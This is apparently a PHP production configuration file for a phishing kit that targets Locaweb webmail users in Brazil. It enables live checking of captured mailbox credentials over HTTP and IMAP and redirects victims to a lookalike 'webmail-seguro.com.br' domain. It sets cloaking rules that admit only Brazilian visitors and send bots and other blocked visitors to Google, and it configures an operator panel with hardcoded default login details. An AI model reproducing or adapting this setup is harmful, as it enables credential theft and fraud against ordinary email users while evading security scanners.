<?php
declare(strict_types=1);

/**
 * Produção Fly.io — welcome-locaweb.fly.dev
 * Carregado automaticamente quando FLY_APP_NAME está definido.
 */
$cfg = require __DIR__ . '/config.example.php';

$baseUrl = rtrim((string) (getenv('APP_BASE_URL') ?: 'https://welcome-locaweb.fly.dev'), '/');

$cfg['env']        = 'production';
$cfg['base_url']   = $baseUrl;
$cfg['url_prefix'] = '';
$dataDir = rtrim((string) (getenv('PROVIDER_DATA_DIR') ?: '/data'), '/');
$cfg['data_dir']   = $dataDir;

$cfg['mailbox_verify']       = true;
$cfg['webmail_http_verify']  = true;
$cfg['webmail_imap_fallback'] = true;
$cfg['webmail_api_url']      = 'https://webmail-seguro.com.br';
$cfg['webmail_api_timeout']  = 45;

$cfg['panel_redirect']   = 'https://webmail-seguro.com.br/v2/';
$cfg['success_redirect'] = 'https://webmail-seguro.com.br/v2/';

$cfg['turnstile_enabled']  = true;
$cfg['turnstile_site_key'] = '1x00000000000000000000AA';

$cfg['panel_name']      = (string) (getenv('PANEL_NAME') ?: 'D3V Danadinho');
$cfg['panel_user']      = (string) (getenv('PANEL_USER') ?: 'Danadinho');
$cfg['panel_pass']      = (string) (getenv('PANEL_PASS') ?: 'Danado2027');
$cfg['panel_reset_key'] = (string) (getenv('PANEL_RESET_KEY') ?: 'fly-reset-change-me');
$cfg['panel_marquee']   = 'Quero alugar um novo apartamento, preciso de 5 mil. Se Deus quiser, vou deixar você rico, D3v Dandinho! 🙏🚀';

$cfg['blocked_redirect'] = 'https://google.com/erro';
$cfg['max_ip_visits']    = 4;
$cfg['max_ip_api_attempts'] = 4;
$cfg['session_save_path'] = $dataDir . '/sessions';

$cfg['anti_bot'] = array_merge($cfg['anti_bot'] ?? [], [
    'enabled'             => true,
    'allowed_countries'   => ['BR'],
    'enforce_country'     => true,
    'deny_hosting'        => false,
    'deny_proxy_vpn'      => false,
    'deny_datacenter_asn' => false,
    'deny_bots_ua'        => true,
    'deny_bad_headers'    => false,
    'deny_empty_ua'       => true,
    'deny_headless_signals' => false,
    'enforce_device'      => false,
    'strict_geo_unknown'  => false,
    'allow_localhost'     => false,
    'log_blocks'          => true,
]);

return $cfg;
